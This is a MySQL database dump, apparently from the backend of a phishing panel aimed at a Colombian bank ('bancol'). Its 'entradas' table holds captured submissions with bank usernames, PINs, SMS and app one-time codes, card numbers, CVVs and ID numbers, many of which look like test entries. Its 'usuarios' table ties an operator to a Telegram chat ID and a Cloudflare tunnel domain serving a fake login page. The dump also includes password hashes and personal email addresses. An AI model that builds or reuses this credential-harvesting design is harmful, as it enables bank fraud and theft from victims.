-- MySQL dump 10.13  Distrib 8.0.42, for Linux (x86_64)
--
-- Host: localhost    Database: general
-- ------------------------------------------------------
-- Server version	8.0.42

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `entradas`
--

DROP TABLE IF EXISTS `entradas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `entradas` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `uniqid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `datos` json NOT NULL,
  `status` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pending',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `entradas_uniqid_unique` (`uniqid`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `entradas`
--

LOCK TABLES `entradas` WRITE;
/*!40000 ALTER TABLE `entradas` DISABLE KEYS */;
INSERT INTO `entradas` VALUES (1,'e_696eb07c6954b2.32530965','{\"email\": \"juan@test.com\", \"nombre\": \"Juan Pérez\"}','completed','2026-01-19 17:30:20','2026-01-19 17:36:43'),(2,'test_telegram_1768928177','{\"email\": \"test@example.com\", \"nombre\": \"Prueba Telegram\", \"mensaje\": \"Verificando integración\"}','test','2026-01-20 11:56:17','2026-01-20 11:56:17'),(3,'test_telegram_1768928420','{\"email\": \"test@example.com\", \"ciudad\": \"Lima\", \"nombre\": \"Prueba Telegram\", \"mensaje\": \"Verificando integración\", \"telefono\": \"+51 999 888 777\"}','actualizado','2026-01-20 12:00:20','2026-01-20 12:01:16'),(4,'user_1768941385298_y4ifqe4rg','{\"email\": \"favianmayo345@gmail.com\", \"nombre\": \"NOMBRE DE PRUEBA 7\", \"documento\": \"5445778766\", \"pregunta1\": \"nose\", \"pregunta2\": \"1234\", \"directorio\": \"verificacion\", \"codigo_email\": \"545677\"}','t-correo','2026-01-20 15:36:26','2026-01-21 03:14:08'),(5,'user_1768983579981_jiee0wvft','{\"email\": \"superadmin@radiant-financial.org\", \"codigo\": \"899999\", \"status\": \"correo\", \"telefono\": \"32455334531\", \"directorio\": \"verificacion\", \"codigo_email\": \"545677\"}','t-correo','2026-01-21 03:19:41','2026-01-21 10:53:35'),(6,'user_1769034648238_2z7qr5u9i','{\"email\": \"superadmin@radiant-financial.org\", \"status\": \"correo\", \"directorio\": \"verificacion\", \"codigo_email\": \"545677\"}','correo','2026-01-21 17:30:50','2026-01-21 17:39:25'),(7,'user_1769052291359_pinbxz3f8','{\"cvv\": \"963\", \"clave\": \"1212\", \"email\": \"correo@gmail.com\", \"cedula\": \"3454334555\", \"ciudad\": \"Cali\", \"nombre\": \"Pepe peres\", \"otpapp\": \"545667\", \"otpsms\": \"445566\", \"status\": \"tdc\", \"celular\": \"3212232233\", \"clave-0\": \"•\", \"clave-1\": \"•\", \"clave-2\": \"•\", \"clave-3\": \"•\", \"usuario\": \"prueba11\", \"direccion\": \"Calle 56 8932\", \"cvvCredito\": \"963\", \"directorio\": \"bancol\", \"clavecajero\": \"5434\", \"clavevirtual\": \"2323\", \"numeroTarjeta\": \"4093550074473962\", \"fechaVencimiento\": \"09/2028\", \"numeroTarjetaCredito\": \"4093550074473962\", \"fechaVencimientoCredito\": \"09/2028\"}','t-exito','2026-01-21 22:24:51','2026-01-22 00:18:54'),(8,'user_1769059847474_0t0dsgsv3','{\"clave\": \"1122\", \"usuario\": \"prueba90\", \"directorio\": \"bancol\"}','t-error','2026-01-22 00:30:47','2026-01-22 00:42:06'),(9,'user_1769060566572_54zraxw8e','{\"clave\": \"2233\", \"otpapp\": \"565656\", \"otpsms\": \"456789\", \"status\": \"pinvir\", \"usuario\": \"prueba44\", \"directorio\": \"bancol\", \"clavevirtual\": \"5454\"}','t-exito','2026-01-22 00:42:52','2026-01-22 00:44:03'),(10,'user_1769061326664_g3jbsxqu9','{\"clave\": \"2121\", \"otpapp\": \"234567\", \"status\": \"login\", \"usuario\": \"prueba21\", \"directorio\": \"bancol\"}','t-exito','2026-01-22 00:55:27','2026-01-22 05:58:46');
/*!40000 ALTER TABLE `entradas` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `migrations` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (1,'2026_01_19_170828_create_entradas_table',1),(2,'2026_01_19_173429_add_status_to_entradas_table',2),(3,'2026_01_21_121806_create_usuarios_table',3),(4,'2026_01_21_122549_create_personal_access_tokens_table',4),(5,'2026_01_21_123721_create_users_table',5),(6,'2026_01_21_153529_add_tunnel_pid_to_usuarios_table',6),(7,'2026_01_21_154423_add_tunnel_status_to_usuarios_table',7);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `personal_access_tokens`
--

DROP TABLE IF EXISTS `personal_access_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `personal_access_tokens` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint unsigned NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`),
  KEY `personal_access_tokens_expires_at_index` (`expires_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `personal_access_tokens`
--

LOCK TABLES `personal_access_tokens` WRITE;
/*!40000 ALTER TABLE `personal_access_tokens` DISABLE KEYS */;
/*!40000 ALTER TABLE `personal_access_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `estado` enum('pendiente','aprobado','rechazado') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pendiente',
  `rol` enum('user','admin') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'user',
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'Administrador','admin@admin.com','$2y$12$RMZUupEaj/S6j1Z8KpyeyusFZ6dcBJYgyojLxacnsaQ8C56QDXgS2','aprobado','admin',NULL,'2026-01-21 12:42:53','2026-01-21 12:42:53'),(2,'FELIPE','juliocesardiaz3801@gmail.com','$2y$12$jqXx4o2Q3x5w/d4.OO6VtOXe9ttVeu2FLA1UstWWWhMOCJJ8J0wHq','aprobado','user',NULL,'2026-01-21 12:45:59','2026-01-21 12:46:45');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `usuarios`
--

DROP TABLE IF EXISTS `usuarios`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `usuarios` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `usuario` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `chatids` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dominio` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `tunnel_pid` int DEFAULT NULL,
  `tunnel_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pending',
  `directorio` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `estado` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'activo',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `usuarios`
--

LOCK TABLES `usuarios` WRITE;
/*!40000 ALTER TABLE `usuarios` DISABLE KEYS */;
INSERT INTO `usuarios` VALUES (1,'test_tunnel','7690150318','still-scholarship-regulated-frame.trycloudflare.com',2690566,'active','bancol/login','activo','2026-01-21 20:45:47','2026-01-21 17:48:11');
/*!40000 ALTER TABLE `usuarios` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2026-01-22 13:00:03
